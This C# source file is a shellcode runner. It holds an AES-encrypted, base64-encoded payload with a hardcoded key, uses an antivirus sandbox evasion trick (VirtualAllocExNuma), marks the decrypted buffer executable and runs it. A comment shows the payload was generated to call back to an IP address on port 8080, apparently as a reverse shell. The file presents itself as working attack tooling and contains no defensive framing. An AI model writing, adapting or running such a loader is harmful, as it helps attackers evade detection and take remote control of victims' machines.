using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ShellCodeRunnerB64
{
    internal class Program
    {
        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        private delegate Int32 ShellcodeDelegate();
        static void Shellcode()
        {
            // attempt heuristics/behaviour bypass
            IntPtr mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // decrypt the base64 payload - change these to your own encrypted payload and key
            //python3 shellenc.py -i 172.29.216.161  -l 8080 -m thread  -k AES-014-Mw4q73-0xBugatti-784WQW7

            string payload = "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\r\n\r\n";
            string key = "AES-014-Mw4q73-0xBugatti-784WQW7";

            byte[] buf = Decrypt(key, payload);

           unsafe{
                fixed (byte* ptr = buf)
                {
                    // set the memory as executable and execute the function pointer (as a delegate)
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)buf.Length, (UInt32)Protection.PAGE_EXECUTE_READWRITE, out uint lpfOldProtect);

                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }
            }
        }

        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
        static void Main(string[] args)
        {


            Shellcode();

        
        }}}
